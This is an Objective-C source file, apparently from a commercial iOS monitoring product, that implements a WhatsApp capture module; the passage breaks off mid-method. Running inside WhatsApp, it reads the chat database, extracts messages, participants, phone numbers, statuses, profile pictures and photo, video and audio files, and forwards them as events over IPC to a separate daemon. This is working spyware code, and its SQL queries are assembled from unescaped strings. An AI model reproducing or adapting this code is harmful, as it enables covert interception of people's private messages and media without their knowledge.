/**
 - Project name :  MSFSP
 - Class name   :  WhatsAppUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

// WhatsApp Utils
#import "WhatsAppUtils.h"
#import "WhatsAppMessageStore.h"
#import "WhatsAppMediaUtils.h"
#import "WhatsAppMediaObject.h"

// Other Utils
#import "FMDatabase.h"
#import "DefStd.h"
#import "DateTimeFormat.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "DaemonPrivateHome.h"
#import "FxIMEvent.h"
#import "FxIMGeoTag.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "ABContactsManager.h"
#import "ChatManager.h"
#import "WAContactsStorage.h"
#import "IMShareUtils.h"
#import "WAChatSession.h"
#import "WAGroupMember.h"
#import "WAChatStorage.h"
#import "WAStatus.h"

// WhatsApp header files
#import "XMPPStanzaElement.h"
#import "XMPPStanzaElement+2-11-9.h"
#import "XMPPStanza.h"
#import "XMPPStanza+2-11-9.h"
#import "XMPPMessageStanza.h"
#import "XMPPMessageStanza+2-11-9.h"
#import "WAMessage.h"
#import "WAMessage+2-12-14.h"
#import "WAProfilePictureManager.h"

#import "WAGroupInfo.h"
#import "WASharedAppData.h"

#import "WAMediaItem.h"
#import "WAMediaItem+2-16-2.h"
#import "WAMediaItem+2-16-6.h"
#import "WAMediaItem+2-16-7.h"

#import "WAMediaCipher.h"
#import "WAChatStorage-MainApp.h"

#import <objc/runtime.h>

#pragma mark -
#pragma mark Constant Declaration

// --------------------------------------------------------------------------------------------
static NSString* const kConverstaionIdKey					= @"ConverstaionIdKey";
static NSString* const kConverstaionNameKey					= @"ConverstaionNameKey";

// -- finding group number
static NSString* const kSelectWhatsAppGroupInfo				= @"Select ZGROUPINFO from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";
static NSString* const kSelectWhatsAppGroupInfoWithJID		= @"Select ZGROUPINFO from ZWACHATSESSION where ZCONTACTJID='%@'";
//static NSString* const kSelectWhatsAppGroupName			= @"Select ZTEXT from ZWAMESSAGE where ZCHATSESSION in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@') AND ZGROUPEVENTTYPE = 1";
//static NSString* const kSelectWhatsAppGroupName2			= @"Select ZPARTNERNAME from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";
static NSString* const kSelectWhatsAppGroupNameID			= @"Select ZPARTNERNAME, ZCONTACTJID from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";

// -- query participant
static NSString* const kSelectWhatsAppGroupMember			= @"Select ZCONTACTNAME, ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION in (SELECT Z_PK from ZWACHATSESSION where ZCONTACTJID='%@') AND ZISACTIVE = 1";
static NSString* const kSelectWhatsAppGroupChat				= @"Select ZCONTACTNAME, ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@') AND ZISACTIVE = 1";
static NSString* const kSelectWhatsAppSingleChat			= @"Select ZPARTNERNAME,ZCONTACTJID from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";

// -- query audio,photo,video
static NSString* const kSelectWhatsAppMediaPath             = @"Select ZMEDIALOCALPATH from ZWAMEDIAITEM where Z_PK in (SELECT ZMEDIAITEM from ZWAMESSAGE where ZSTANZAID='%@')";

// -- WhatsApp content type
static NSString * const kWhatsAppContentTypeImage			= @"image";
static NSString * const kWhatsAppContentTypeAudio			= @"audio";
static NSString * const kWhatsAppContentTypeVideo			= @"video";
static NSString * const kWhatsAppContentTypeLocation		= @"location";
static NSString * const kWhatsAppContentTypeContact			= @"vcard";
static NSString * const kWhatsAppContentTypeAudioPTT		= @"ptt";
static NSString * const kWhatsAppContentTypeContact2        = @"contact"; // Incoming shared contact from Android
static NSString * const kWhatsAppContentTypeGif             = @"gif";

static NSString * const kWhatsAppAppGroupIdentifier         = @"group.net.whatsapp.WhatsApp.shared";

// --------------------------------------------------------------------------------------------



@interface WhatsAppUtils (private)

// -- private method
- (NSString *)	searchWhatsAppPath;
- (NSDictionary *) findConversationNameId: (NSString *) aMessageId;
- (NSDictionary *) findConversationNameIdv2: (NSString *) aMessageId;
- (NSArray *)	selectParticipantsWithMsgID:(NSString *) messageID 
				messageSenderToBeFiltered:(NSString *) aSender
								  fromJID:(NSString *) aFromJID;
- (NSUInteger)	groupNumberFromJID:(NSString *) aFromJID;
- (NSInteger)	groupNumberFromMessage:(NSString *) messageID;
- (NSString *)	formatWhatsAppID:(NSString*)wID;
- (BOOL)		isSupportedWhatsAppContentType: (NSString *) aContentTypeString;


- (NSData *)	getImageForMessageID: (NSString *) aMessageID;
- (NSString *)	getMediaPathForMessageID: (NSString *) aMessageID;

+ (WAChatStorage *) getWAChatStorage;
+ (WAContactsStorage *) getWAContactStorage;
+ (NSString *)	getCurrentStatus;
+ (WAMessage *) getWAMessageWithID: (NSString *) aMessageID JID: (NSString *) aJID;


+ (BOOL)		sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
+ (void)		sendWhatsAppEvent: (FxIMEvent *) aIMEvent;

+ (void)		sendAnyContentTypeEventUserID: (NSString *) aUserID						// user id
					   userDisplayName: (NSString *) aUserDisplayName				// user display name
					 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
				userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture
						  userLocation: (FxIMGeoTag *) aUserLocation

				 messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
							   message: (NSString *) aMessage
							 direction: (FxEventDirection) aDirection				// direction

						conversationID: (NSString *) aConversationID				// conversation id
					  conversationName: (NSString *) aConversationName				// conversation name
			conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

						  participants: (NSArray *) aParticipants														

						   attachments: (NSArray *) aAttachments

						 shareLocation: (FxIMGeoTag *) aSharedLocation;

+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction
                            imageCaption: (NSString *) aCaption                     // caption

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants			 

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData;

+ (void) sendVideoContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction
                            videoCaption: (NSString *) aCaption                     // caption

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   videoPath: (NSURL *) aVideoPath
						   thumbnailData: (NSData *) aThumbnailData;

+ (void) send2VideoContentTypeEventUserID: (NSString *) aUserID						// user id
						  userDisplayName: (NSString *) aUserDisplayName				// user display name
						userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								direction: (FxEventDirection) aDirection				// direction
                             videoCaption: (NSString *) aCaption                    // caption

						   conversationID: (NSString *) aConversationID				// conversation id
						 conversationName: (NSString *) aConversationName			// conversation name
			   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							 participants: (NSArray *) aParticipants	
								videoPath: (NSURL *) aVideoPath 
							thumbnailData: (NSData *) aThumbnailData;


+ (void) sendAudioContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   audioPath: (NSURL *) aAudioPath;	


+ (void) send2AudioContentTypeEventUserID: (NSString *) aUserID						// user id
						  userDisplayName: (NSString *) aUserDisplayName				// user display name
						userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								direction: (FxEventDirection) aDirection				// direction

						   conversationID: (NSString *) aConversationID				// conversation id
						 conversationName: (NSString *) aConversationName			// conversation name
			   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							 participants: (NSArray *) aParticipants	
								audioPath: (NSURL *) aAudioPath;
	
+ (void) sendWhatsAppVideoInfo: (NSDictionary *) aLineInfo;

+ (void) sendWhatsAppAudioInfo: (NSDictionary *) aLineInfo;

// -- Photo Attachment Utils
+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData;


// -- Video Attachment Utils
+ (FxAttachment *) createVideoAttachmentForData: (NSData *) aData 
								  thumbnailData: (NSData *) aThumbnailData
								  fileExtension: (NSString *) aExtension;

// -- Audio Attachment Utils
+ (FxAttachment *) createAudioAttachmentForData: (NSData *) aData
								  fileExtension: (NSString *) aExtension;
	

// -- General Attachment Utils
+ (NSString *)	createTimeStamp;
+ (NSString *)	getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension;
+ (void)		deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

- (NSString *) getContactStatus:(NSString *)aContactId;
@end

static WhatsAppUtils *_WhatsAppUtils = nil;

@implementation WhatsAppUtils

@synthesize mAccountInfo;

@synthesize mIMSharedFileSender;

@synthesize mSendingEventQueue;

+ (id) sharedWhatsAppUtils {
	if (_WhatsAppUtils == nil) {
		_WhatsAppUtils = [[WhatsAppUtils alloc] init];
		if (_WhatsAppUtils) {
			if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
				SharedFile2IPCSender *sharedFileSender = nil;
				
				sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kWhatsAppMessagePort1];
				[_WhatsAppUtils setMIMSharedFileSender:sharedFileSender];
				[sharedFileSender release];
				sharedFileSender = nil;
			}
            
            NSOperationQueue *sendingEventQueue = [[NSOperationQueue alloc] init];
            sendingEventQueue.maxConcurrentOperationCount = 1;
            [_WhatsAppUtils setMSendingEventQueue:sendingEventQueue];
            [sendingEventQueue release];
            sendingEventQueue = nil;
		}
	}
	return (_WhatsAppUtils);
}

/**
 - Method name: init
 - Purpose:This method is used to initalize WhatsAppUtils
 - Argument list and description: No Argument
 - Return description: No return type
 */
- (id) init {
	if ((self = [super init])) {
		NSString *whatsAppApth = [self searchWhatsAppPath];
		if(whatsAppApth) {
			mWhatsAppDB = [FMDatabase databaseWithPath:whatsAppApth];
			[mWhatsAppDB retain];
			[mWhatsAppDB open];
		}
		else {
			DLog (@"WhatsApp DB Error");
		}
		
	}
	return (self);
}

#pragma mark -
#pragma mark Private Method


/**
 - Method name: searchWhatsAppPath:
 - Purpose:  This method is used to search WahtsApp DB path
 - Argument list and description:No Argument
 - Return type and description: No Return type 
 */

- (NSString *) searchWhatsAppPath {
	NSString *whatsAppPath = nil;
	
	// Method 1
	/*NSError *error = nil;
	 NSArray *subFolderList = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile/Applications" error:&error];
	 if (!error) {
		for (NSString *subFolder in subFolderList) {
		BOOL isDirectory = FALSE;																					
		whatsAppPath = [NSString stringWithFormat:@"/var/mobile/Applications/%@", subFolder];
		DLog(@"whatsAppPath %@", subFolder)
		[[NSFileManager defaultManager] fileExistsAtPath:whatsAppPath isDirectory:&isDirectory];						
			if (isDirectory) {
			NSArray *appList = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:whatsAppPath error:&error];
			DLog(@"Apps:%@", appList);
			NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",@"WhatsApp.app"];
			NSArray *result = [appList filteredArrayUsingPredicate:predicate];
			DLog(@"result %@", result)
			if ([result count]) {
				DLog(@"<<<<<< break >>>>>>")
				whatsAppPath = [NSString stringWithFormat:@"%@/Documents/ChatStorage.sqlite", whatsAppPath];
				DLog(@"WhatsAppPath:%@", whatsAppPath);
				break;
				}
			} 
		}
	 }*/

    NSDictionary *bundleInfo    = [[NSBundle mainBundle] infoDictionary];
    NSString *version           = [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    
    // Method 3
    // if whatsapp version 2.11.15 and iOS 8
    if ([IMShareUtils isVersionText:version isHigherThanOrEqual:@"2.11.5"]      &&
        [[[UIDevice currentDevice] systemVersion] floatValue] >= 8.0)           {
        
        NSString *appSharePath = [self getAppShareFolderPath];
        if (appSharePath) {
            whatsAppPath = [NSString stringWithFormat:@"%@/ChatStorage.sqlite", appSharePath];
            DLog(@"WhatsApp path %@", whatsAppPath)
        }
    } else {
        // Method 2
        NSArray *paths = NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES);
        DLog (@"paths %@", paths)
        if ([paths count]) {
            NSString *docDirPath = [paths objectAtIndex:0];
            whatsAppPath = [NSString stringWithFormat:@"%@/ChatStorage.sqlite", docDirPath];
        }
    }
    
    DLog (@"WHATSAPP DB PATH:%@", whatsAppPath);
    
	return (whatsAppPath);
}


- (NSDictionary *) findConversationNameId: (NSString *) aMessageId {
	NSString *conversationName = @"";
	NSString *conversationId   = @"";
	
	// -- find conversation id and name
	NSString *groupNameIdSql = [NSString stringWithFormat:kSelectWhatsAppGroupNameID, aMessageId];		
	DLog (@"groupNameIdSql %@", groupNameIdSql)
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:groupNameIdSql];
	while ([resultSet next]) {
		conversationName = [resultSet stringForColumn:@"ZPARTNERNAME"];
		conversationId = [resultSet stringForColumn:@"ZCONTACTJID"];				
		DLog (@"conversationName %@", conversationName)
		DLog (@"conversationId %@", conversationId)
	}
	
	return [NSDictionary dictionaryWithObjectsAndKeys:conversationName, kConverstaionNameKey,
			conversationId, kConverstaionIdKey, nil];	
}


/*	
	This is used in method createOutgoingWhatsAppEvent:
	If no convervation found from the query, return empty dictionary.
 */
- (NSDictionary *) findConversationNameIdv2: (NSString *) aMessageId {
	NSString *conversationName	= @"";
	NSString *conversationId	= @"";	
	
	// -- find conversation id and name
	NSString *groupNameIdSql	= [NSString stringWithFormat:kSelectWhatsAppGroupNameID, aMessageId];		
	//DLog (@"groupNameIdSql %@", groupNameIdSql)
	
	FMResultSet* resultSet		= [mWhatsAppDB executeQuery:groupNameIdSql];
	
	while ([resultSet next]) {
		conversationName		= [resultSet stringForColumn:@"ZPARTNERNAME"];
		conversationId			= [resultSet stringForColumn:@"ZCONTACTJID"];				
		DLog (@"conversationName [%@] conversation id [%@]", conversationName, conversationId)		
	}
	NSDictionary *returnConversation = [NSDictionary dictionary];	
	
	if ([conversationId length]		&&	[conversationName length]) {
		returnConversation  = [NSDictionary dictionaryWithObjectsAndKeys:
							   conversationName,	kConverstaionNameKey,
							   conversationId,		kConverstaionIdKey,
							   nil];	
	} 	
	return returnConversation;
}

/**
 - Method name: selectParticipants
 - Purpose:This method is used to select Participants
 - Argument list and description: No Argument
 - Return description: requestArray(NSArray)
 */

- (NSArray *) selectParticipantsWithMsgID:(NSString *) messageID 
				messageSenderToBeFiltered:(NSString *) aSender 
								  fromJID:(NSString *) aFromJID {
						
	
	NSMutableArray* resultArray = [[NSMutableArray alloc] init];
	NSString *sql				= nil;	
	
	// -- find group info using contact JID
	NSInteger groupNumber = 0;
	if (aFromJID) {														// incoming case
		groupNumber		= [self groupNumberFromJID:aFromJID];
		DLog(@"> group number (JID) %ld", (long)groupNumber);
		if (groupNumber != 0)
			sql = [NSString stringWithFormat:kSelectWhatsAppGroupMember, aFromJID];	
	} else {															// outgoing case
		groupNumber		= [self groupNumberFromMessage:messageID];
		DLog(@"> group number (w/o JID) %ld", (long)groupNumber);
		if (groupNumber != 0)
			sql = [NSString stringWithFormat:kSelectWhatsAppGroupChat, messageID];
	}
	
	// -- Group number exists
	if (groupNumber != 0) {			
		DLog (@"> Group number exists %ld", (long)groupNumber)
		//sql = [NSString stringWithFormat:kSelectWhatsAppGroupChat, messageID];
		//sql = [NSString stringWithFormat:kSelectWhatsAppGroupMember, aFromJID];	
		
		
		// -- find group name	
		/* Not use group id as conversation id because individual coversation does not has group id
		NSString *groupNameSql = [NSString stringWithFormat:kSelectWhatsAppGroupName2, messageID];		
		DLog (@"groupNameSql %@", groupNameSql)
		FMResultSet* resultSet = [mWhatsAppDB executeQuery:groupNameSql];
		while ([resultSet next]) {
			groupName = [resultSet stringForColumnIndex:0];
			DLog (@"group name %@", groupName)
		}
		 */
	}
	// -- Group number does not exist
	else {
		DLog (@"> Group number does not exist in the first finding.... delete or single chat")
		sql = [NSString stringWithFormat:kSelectWhatsAppSingleChat, messageID];								
		// In case of incoming and Single conversation, the target device is not included in the result
		// In case of incoming and Group conversation, the target device is included in the query result			
	}
	
	//DLog(@"> SQL: %@",sql);	
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:sql];	
	
	int i = 1;
	while ([resultSet next]) {
		NSString *contactNumber = [self formatWhatsAppID:[resultSet stringForColumnIndex:1]];
		NSString *contactName = [resultSet stringForColumnIndex:0];
		
		DLog (@"contact number: %@", contactNumber)
		DLog (@"contact name %d: %@", i, contactName)
		DLog (@"aSender: %@", aSender)
        
		if (contactNumber) {	
			// -- Ensure that participants does NOT include the sender of the message
			if (![contactNumber isEqualToString:aSender]) {													// not sender
				NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
				
				[dictionary setValue:contactNumber forKey:kWhatsAppContactNumber];				
				[dictionary setValue:contactName forKey:kWhatsAppContactName];
				[dictionary setValue:[resultSet stringForColumnIndex:1] forKey:kWhatsAppContactJID];
                
				DLog (@"assigned contact name %@", [mAccountInfo objectForKey:kWhatsAppContactName])
				
				//DLog (@"resultArray before %@", resultArray)
				// -- assign contact name for the target account if it is not exist
				if ([contactNumber isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
					if ([mAccountInfo objectForKey:kWhatsAppContactName] != nil                 &&
						![[mAccountInfo objectForKey:kWhatsAppContactName] isEqualToString:@""] ) {
						//if ([contactName isEqualToString:@""] || contactName == nil ) {
						[dictionary setValue:[mAccountInfo objectForKey:kWhatsAppContactName]
									  forKey:kWhatsAppContactName];
						//}	
					}
					DLog (@"insert at index 0")					
					[resultArray insertObject:dictionary atIndex:0];				// The target must be in the 1st index of array for incoming
				} else {
					[resultArray addObject:dictionary];
				}
					
				//DLog (@"resultArray after %@", resultArray)
				
				[dictionary release];
				dictionary = nil;
			}
		}
		i++;
	}
	DLog(@"> Participants Array:%@", resultArray);
	return [resultArray autorelease];
}

/**
 - Method name:				groupNumberFromMessage:
 - Purpose:  This method is used to identify chat group if gno=0 no group chat
 - Argument list and description: messageID (NSString)
 - Return type and description:gno(NSUInteger)  
 */
- (NSInteger) groupNumberFromMessage:(NSString *) messageID {
	NSUInteger gno = 0;
	//DLog (@"sql to get group number %@", [NSString stringWithFormat:kSelectWhatsAppGroupInfo, messageID])
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:[NSString stringWithFormat:kSelectWhatsAppGroupInfo,messageID]];
	while ([resultSet next]) {
	    gno = [resultSet intForColumnIndex:0];
	}
	return gno;
}

- (NSUInteger) groupNumberFromJID:(NSString *) aFromJID {
	NSUInteger gno = 0;
	//DLog (@"sql to get group number %@", [NSString stringWithFormat:kSelectWhatsAppGroupInfoWithJID, aFromJID])
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:[NSString stringWithFormat:kSelectWhatsAppGroupInfoWithJID,aFromJID]];
	while ([resultSet next]) {
		//DLog (@"[resultSet intForColumnIndex:0] %d", [resultSet intForColumnIndex:0])
	    gno = [resultSet intForColumnIndex:0];
	}
	return gno;
}

/**
 - Method name: formatWhatsAppID:
 - Purpose:  This method is used to format WhatsApp Id
 - Argument list and description: wID (NSString)
 - Return type and description:whatsAppID(NSString)  
 */
- (NSString *) formatWhatsAppID: (NSString *) wID {
	NSString *whatsAppID = @"";
	NSArray *numberArr = [wID componentsSeparatedByString:@"@"];
	if([numberArr count]) {
		whatsAppID = [numberArr objectAtIndex:0];
	}
	return whatsAppID;
}

- (BOOL) isSupportedWhatsAppContentType: (NSString *) aContentTypeString {
	BOOL isSupported = NO;
	if ([aContentTypeString isEqualToString:kWhatsAppContentTypeImage]		||
		[aContentTypeString isEqualToString:kWhatsAppContentTypeVideo]		||
		[aContentTypeString isEqualToString:kWhatsAppContentTypeAudio]		||
		[aContentTypeString isEqualToString:kWhatsAppContentTypeLocation]	||
		[aContentTypeString isEqualToString:kWhatsAppContentTypeContact]    ||
        [aContentTypeString isEqualToString:kWhatsAppContentTypeAudioPTT]   ||
        [aContentTypeString isEqualToString:kWhatsAppContentTypeContact2]   ||
        [aContentTypeString isEqualToString:kWhatsAppContentTypeGif]){
		isSupported = YES;
	}	
	return isSupported;
}

#pragma mark Public Methods


/**
 - Method name: incomingMessageParts:
 - Purpose:  This method is used to  create Incoming incomingMessageParts
 - Argument list and description: aArg (id)
 - Return type and description: (id)  
 */
- (id) incomingMessageParts: (id) aArg {
	id incomingParts = nil;
	if([aArg isKindOfClass:[NSArray class]]){
		for (id element in aArg) {
			if ([element isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
				incomingParts = element;
				break;
			}
		}
	}
	return incomingParts;
}

/**
 - Method name: accountInfo:userName:
 - Purpose:  This method is used to create WhatsApp account info
 - Argument list and description: aUserID (NSString *),userName(NSString *)
 - Return type and description: No Return 
 */
- (NSDictionary *) accountInfo: (NSString *) aUserID
					  userName: (NSString *) aUserName {
	
	NSMutableDictionary *accountDict = [[NSMutableDictionary alloc] init];
	[accountDict setObject:aUserID forKey:kWhatsAppContactNumber];
	[accountDict setObject:aUserName forKey:kWhatsAppContactName];
	return [accountDict autorelease];
}


- (NSData *) getImageForMessageID: (NSString *) aMessageID {
	DLog (@"getImageForMessageID %@", aMessageID)
	
	NSString *sql			= [NSString stringWithFormat:kSelectWhatsAppMediaPath, aMessageID];			
	//DLog (@"sql statement for image %@", sql)
	FMResultSet* resultSet	= [mWhatsAppDB executeQuery:sql];
	NSString *imagePath		= nil;
	
	while ([resultSet next]) {
		DLog (@"There is a result %@", [resultSet resultDict])
		imagePath = [resultSet stringForColumnIndex:0];
		DLog (@">>>>imagePath  %@", imagePath)
		if (imagePath) {
			NSArray *libPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);	// --> APP/Library/
			DLog (@">>>> libPaths %@", libPaths)
			if ([libPaths objectAtIndex:0]) {
				imagePath = [[libPaths objectAtIndex:0] stringByAppendingPathComponent:imagePath];
				DLog (@"image path %@", imagePath)
			}			
		}
	}
	
	NSData *imageData = nil;
	
	// -- get image data
	if (imagePath) {
		UIImage *image	= [[UIImage alloc] initWithContentsOfFile:imagePath];		
		imageData		= UIImageJPEGRepresentation(image, 0);		
		[image release];
		image			= nil;
	}
	
	if (!imageData) {
		DLog (@"===================================")
		DLog (@"IMAGE does not EXIST yet")
		DLog (@"===================================")
	}
	return imageData;
}


- (NSString *) getMediaPathForMessageID: (NSString *) aMessageID {
	DLog (@"getMediaPathForMessageID %@", aMessageID)
	
	NSString *sql			= [NSString stringWithFormat:kSelectWhatsAppMediaPath, aMessageID];			
	DLog (@"sql statement for media path %@", sql)
	FMResultSet* resultSet	= [mWhatsAppDB executeQuery:sql];
	__block NSString *mediaPath		= nil;
	
//    [mWhatsAppDBQue inDatabase:^(FMDatabase *db) {
//        FMResultSet *resultSet = [db executeQuery:sql];
//        while ([resultSet next]) {
//            DLog (@"There is a result %@", [resultSet resultDict])
//            mediaPath = [resultSet stringForColumnIndex:0];
//            DLog (@">>>>mediaPath  %@", mediaPath)
//            if (mediaPath) {
//                NSArray *libPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);	// --> APP/Library/
//                DLog (@">>>> libPaths %@", libPaths)
//                if ([libPaths objectAtIndex:0]) {
//                    mediaPath = [[libPaths objectAtIndex:0] stringByAppendingPathComponent:mediaPath];
//                    DLog (@"mediapath %@", mediaPath)
//                }			
//            }
//        }
//    }];
    
	while ([resultSet next]) {
		DLog (@"There is a result %@", [resultSet resultDict])
		mediaPath = [resultSet stringForColumnIndex:0];
		DLog (@">>>>mediaPath  %@", mediaPath)
		if (mediaPath) {
			NSArray *libPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);	// --> APP/Library/
			DLog (@">>>> libPaths %@", libPaths)
			if ([libPaths objectAtIndex:0]) {
				mediaPath = [[libPaths objectAtIndex:0] stringByAppendingPathComponent:mediaPath];
				DLog (@"mediapath %@", mediaPath)
			}			
		}
	}
				
	if (!mediaPath) {
		DLog (@"===================================")
		DLog (@"AUDIO/VIDEO does not EXIST yet")
		DLog (@"===================================")
	}
	return mediaPath;
}

- (BOOL) shouldProcess: (id) aOutGoingEvent {
	BOOL shouldProcess			= NO;
	
	NSString *message			= (NSString *)[aOutGoingEvent text];	
	NSString *mediaTypeString	= [aOutGoingEvent stringForMediaType: [aOutGoingEvent mediaType]];		
	DLog (@"media type string [%@] of message [%@]", mediaTypeString, message)	
	
	if ([self isSupportedWhatsAppContentType:mediaTypeString] || message) {
		shouldProcess			= YES;
	}		
	return shouldProcess;
}

+ (WAChatStorage *) getWAChatStorage {
	Class $ChatManager					= objc_getClass("ChatManager");
	ChatManager * chatManager			= [$ChatManager sharedManager];
    DLog(@"chatManager = %@", chatManager)
    
    id storage = [chatManager storage];
    DLog(@"storage = %@", storage)
    
    if (!storage) {
        Class $WASharedAppData = objc_getClass("WASharedAppData");
        storage = [$WASharedAppData chatStorage];
        DLog(@"$WASharedAppData storage = %@", storage)
    }
	return storage;
}

+ (WAContactsStorage *) getWAContactStorage {
    Class $WASharedAppData = objc_getClass("WASharedAppData");
    WAContactsStorage *contactsStorage = [$WASharedAppData contactsStorage];
    return (contactsStorage);
}

+ (NSString *) getCurrentStatus {
	Class $ChatManager					= objc_getClass("ChatManager");
	ChatManager * chatManager			= [$ChatManager sharedManager];
	return [chatManager currentStatus];
}

+ (WAMessage *) getWAMessageWithID: (NSString *) aMessageID JID: (NSString *) aJID {
    DLog(@"aMessageID: %@, aJID: %@", aMessageID, aJID);
    WAMessage *waMessage = nil;
    WAChatStorage *chatStorage = [self getWAChatStorage];
    WAChatSession *chatSession = [chatStorage chatSessionForJID:aJID];
    //DLog(@"chatSession: %@", chatSession);

    if ([chatSession respondsToSelector:@selector(messages)]) { // The method no longer exist in 2.12.10
        NSArray *messages = [[chatSession messages] allObjects];
        NSEnumerator *enumerator = [messages objectEnumerator];
        while (waMessage = [enumerator nextObject]) {
            DLog(@"stanzaID, %@", [waMessage stanzaID]);
            if ([[waMessage stanzaID] isEqualToString:aMessageID]) {
                break;
            }
        }
    }
    else if ([chatStorage respondsToSelector:@selector(messagesWithStanzaID:inChatSession:)]){
        NSArray *messageArray = [chatStorage messagesWithStanzaID:aMessageID inChatSession:chatSession];
        DLog(@"messageArray %@", messageArray);
        
        if (messageArray.count > 0) {
            waMessage = messageArray[0];
            DLog(@"waMessage %@", waMessage);
        }
    }
    else {
        waMessage = [chatSession lastMessage];
    }
    return (waMessage);
}

#pragma mark - *** Incominng entry method
/**
 - Method name: createIncomingWhatsAppEvent:
 - Purpose:  This method is used to  create Incoming whatsapp event
 - Argument list and description: aIncomingEvent (id)
 - Return type and description: No Return 
 */

- (void) createIncomingWhatsAppEvent:(id) aIncomingEvent  {
    @try {
        //DLog (@"Our Thread: %@", [NSThread currentThread])
        
        DLog (@"Incoming message: %@", (NSString *)[aIncomingEvent text])
        
        DLog(@"Capturing XMPPStream =====>incoming....");
        
        
        //DLog(@"locationName %@",		[aIncomingEvent locationName])
        //DLog(@"locationLongitude %@",	[aIncomingEvent locationLongitude])
        //DLog(@"locationLatitude %@",	[aIncomingEvent locationLatitude])
        //DLog(@"vCardContactName %@",	[aIncomingEvent vCardContactName])
        //DLog(@"vCardStringValue %@",	[aIncomingEvent vCardStringValue])
        DLog(@"thumbnailData %@",		[aIncomingEvent thumbnailData])
        //DLog(@"mediaDuration %d",		[aIncomingEvent mediaDuration])
        
        //DLog(@"mediaName %@",			[aIncomingEvent mediaName])
        //DLog(@"mediaURL %@",			[aIncomingEvent mediaURL])
        if ([aIncomingEvent respondsToSelector:@selector(hasMedia)]) {
            // This method is no longer have in 2.11.9
            DLog(@"hasMedia %d",        [aIncomingEvent hasMedia])
        }
        if ([aIncomingEvent respondsToSelector:@selector(hasBody)]) {
            // This method is no longer have in 2.11.9
            DLog(@"hasBody %d",			[aIncomingEvent hasBody])
        }
        if ([aIncomingEvent respondsToSelector:@selector(mediaType)]) {
            DLog(@"mediaType %d",			[aIncomingEvent mediaType])
        }
        if ([aIncomingEvent media])	{
            DLog(@"media %@",				[aIncomingEvent media])
            //DLog(@"media class %@",				[[aIncomingEvent media] class])
            //DLog(@"value %@",				[[aIncomingEvent media] value])
